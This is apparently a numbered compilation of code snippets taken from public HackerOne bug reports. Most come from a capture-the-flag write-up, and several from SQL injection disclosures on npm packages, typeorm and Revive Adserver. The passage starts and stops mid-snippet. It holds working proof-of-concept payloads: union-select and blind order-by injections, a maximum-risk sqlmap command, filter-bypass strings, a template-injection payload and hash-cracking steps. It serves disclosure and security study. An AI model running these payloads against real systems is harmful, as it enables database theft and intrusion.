fetch("https://hackyholidays.h1ctf.com/swag-shop/api/sessions")
  .then(d => d.json())
  .then(d => {
    d.sessions.forEach(obj => {
      console.log(atob(obj))
    })
  });
```

## 73. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

## 74. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```json
{
  "name":"Alice",
  "email":"alice@test.com",
  "winner":"{{template:38dhs_admins_only_header.html}}"
}
```

## 75. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```json
{{winner}}
```

## 76. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```
# SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

### How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

## 77. [#923020](https://hackerone.com/reports/923020)  -  SQL injection on admin.acronis.host development web service
*high, $250*

```
sudo python sqlmap.py -r {PATH TO FILE} --level 5 --risk 3 --random-agent --dbs
```

## 78. [#1663299](https://hackerone.com/reports/1663299)  -  Ability to escape database transaction through SQL injection, leading to arbitrary code execution
*high*

```ruby
# ...
explain_analyze = "EXPLAIN (ANALYZE, COSTS, VERBOSE, BUFFERS, FORMAT JSON) #{raw_sql}"

begin
  conn.transaction(requires_new: true) do
    block = proc do
      analyze_result = conn.protected_attribute.with_parameters(params) do
        conn.execute explain_analyze
      end

      fail ActiveRecord::Rollback
    end

    if config[:use_protected_schema]
      ProtectedAttribute::SchemaUtility.with_requester(user) do
        block.call
      end
    else
      block.call
    end
# ...
```

## 79. [#506644](https://hackerone.com/reports/506644)  -  [@azhou/basemodel] SQL injection
*high*

```js
model.validate = function (source) { ... }
```

## 80. [#506644](https://hackerone.com/reports/506644)  -  [@azhou/basemodel] SQL injection
*high*

```js
model.create({ name: 'John Doe', value: 123.456 }).then(function (id) { ... });
```

## 81. [#506644](https://hackerone.com/reports/506644)  -  [@azhou/basemodel] SQL injection
*high*

```js
model.getById(123).then(function (obj) { ... });
model.getById(456, [ "name", "value" ]).then(function (obj) { ... });
```

## 82. [#506644](https://hackerone.com/reports/506644)  -  [@azhou/basemodel] SQL injection
*high*

```js
model.getAll("name").then(function (list) { ... });
model.getAll([ "name", "value" ]).then(function (list) { ... });
model.getAll([ "name", "value" ], "name DESC").then(function (list) { ... });
```

## 83. [#506644](https://hackerone.com/reports/506644)  -  [@azhou/basemodel] SQL injection
*high*

```js
model.getAllByIds([ 1, 2, 3 ]).then(function (list) { ... });
model.getAllByIds([ 1, 2, 3 ], [ "name", "value" ]).then(function (list) { ... });
model.getAllByIds(objects, "id").then(function (list) { ... });
model.getAllByIds(objects, "id", [ "name", "value" ]).then(function (list) { ... });
```

## 84. [#506644](https://hackerone.com/reports/506644)  -  [@azhou/basemodel] SQL injection
*high*

```js
model.update(123, { name: "Mike Smith" }).then(function () { ... });
```

## 85. [#506644](https://hackerone.com/reports/506644)  -  [@azhou/basemodel] SQL injection
*high*

```js
model.getAll = function (fields, orderby) {
		if (typeof fields == 'string') {
			orderby = fields;
			fields = allFields;
		} else if (Array.isArray(fields) && (typeof orderby == 'string' || !orderby)) {
			if (fields.length == 0)
				fields = allFields;
		} else {
			fields = allFields;
			orderby = "";
		}

		return db.query("SELECT id," + fields.join(",") + " FROM `" + table + "`"
			+ (orderby ? " ORDER BY " + orderby : ""));
	}
```

## 86. [#506644](https://hackerone.com/reports/506644)  -  [@azhou/basemodel] SQL injection
*high*

```
var db = require("@azhou/mysql-wrapper");
db.init("localhost", "mysql", "root", "");

(async () => {
	await db.query("CREATE TABLE IF NOT EXISTS test(id int not null PRIMARY KEY AUTO_INCREMENT, ckey varchar(255), cvalue varchar(255));");
	await db.query("TRUNCATE TABLE test;");

	var model = require("@azhou/basemodel")("test", ["ckey","cvalue"]);
	
	for(var i=0;i<10;i++)
		await model.create({ckey: `k${i}`, cvalue: `v${i}`});
	
	console.log('- get all (normal)');
	console.log(await model.getAll(["ckey", "cvalue"]))

	console.log('- get all (sqli)');
	console.log(await model.getAll(["ckey", "cvalue from test where 1=0 union all select 0, 'sqli','sqli'#"]))

	console.log('- get all (bsqli in order by)');
	console.log(await model.getAll(["ckey", "cvalue"], 'IF(1=1, id, -id) LIMIT 1'))
	console.log(await model.getAll(["ckey", "cvalue"], 'IF(1=0, id, -id) LIMIT 1'))
})()
```

## 87. [#508346](https://hackerone.com/reports/508346)  -  [increments] sql injection
*high*

```javascript
const increments = require('increments');
increments.setup('mysql://root:@localhost:3306/test');
increments.poll('fruits', [{name:'Apples'},{name:'Bananas'},{name:'Oranges'},{name:'Pears'}]);
increments.vote('fruits', 'Oranges","0","0","1","0","0","0","0","","0")'+',(123,"Oranges","0","0","1","0","0","0","0","","0")'.repeat(10)+'#');
increments.statistics('fruits', function(e, f) {
	console.log( f.projectedWinner );
	process.exit(0);
});
```

## 88. [#319458](https://hackerone.com/reports/319458)  -  typeorm does not properly escape parameters when building SQL queries, resulting in potential SQLi
*medium*

```js
import "reflect-metadata";
import {createConnection} from "typeorm";
import {User} from "./entity/User";

createConnection().then(async connection => {
    console.log("Inserting a new user into the database...");
    const user = new User();
    user.firstName = "Timber";
    user.lastName = "Saw";
    user.age = 25;
    await connection.manager.save(user);
    console.log("Saved a new user with id: " + user.id);

    const repository = connection.getRepository(User);

    // SQLi on field names
    const where = { firstName: "Jim" };
    const opts = { where: where };
    where["age=25 OR 25="] = 25;

    // SQLi on limit/offset:
    //opts["skip"] = "OLOLO";
    //opts["take"] = "LOLOL";

    const res = await repository.find(opts);
    console.log(res);
}).catch(error => console.log(error));
```

## 89. [#1069531](https://hackerone.com/reports/1069531)  -  Blind SQL Injection
*critical*

```http
Post: email=0
```

## 90. [#311244](https://hackerone.com/reports/311244)  -  [query-mysql] SQL Injection due to lack of user input sanitization allows to run arbitrary SQL queries when fetching data from database
*critical*

```bash
$ npm install query-mysql
```

## 91. [#311244](https://hackerone.com/reports/311244)  -  [query-mysql] SQL Injection due to lack of user input sanitization allows to run arbitrary SQL queries when fetching data from database
*critical*

```bash
$ node app.js
```

## 92. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```php
php > $a = "adminadmin.php.php";
php > print str_replace("admin.php", "", $a);
admin.php
```

## 93. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```php
php > $a = "secretsecretadminadmin.php.phpadminadmin.php.php";
php > print str_replace("secretadmin.php", "", str_replace("admin.php", "", $a));
secretadmin.php
```

## 94. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```http
Getting Host information for: test.com
```

## 95. [#3395221](https://hackerone.com/reports/3395221)  -  Error-Based & Time-Based SQL Injection in 'keyword' Parameter of admin-search.php Allowing Full Database Access in Revive Adserver v6.0.0
*high*

```php
phpAds_registerGlobalUnslashed('keyword', 'client', 'campaign', 'banner', 'zone', 'affiliate', 'compact');
```

## 96. [#1069263](https://hackerone.com/reports/1069263)  -  First CTF ever!
*critical*

```
The `hash2.txt` format along with options `-m 10 -a 0` tells hashcat to try to turn the ip `203.0.113.33` into the hash `5f2940d65ca4140cc18d0878bc398955` by using a line from `rockyou.txt` and stuffing them together like so: `md5(LINEFROMROCKYOU . '203.0.113.33')`.

We are quickly informed that the salt (pepper, actually) is `mrgrinch463`. Nice!

Using this, let's try our hand at creating a custom payload and see if we can change what the DDoS script attacks.

First, let's insert an IFRAME into the `attack-box` and give it the id `frame` - this way we can easily monitor what goes on in real time. I did this by opening the inspector and editing the first DIV inside the DIV with class `container`, though anywhere on the webpage should do.

{F1138540}

Next, I entered this little snippet into the console:
```
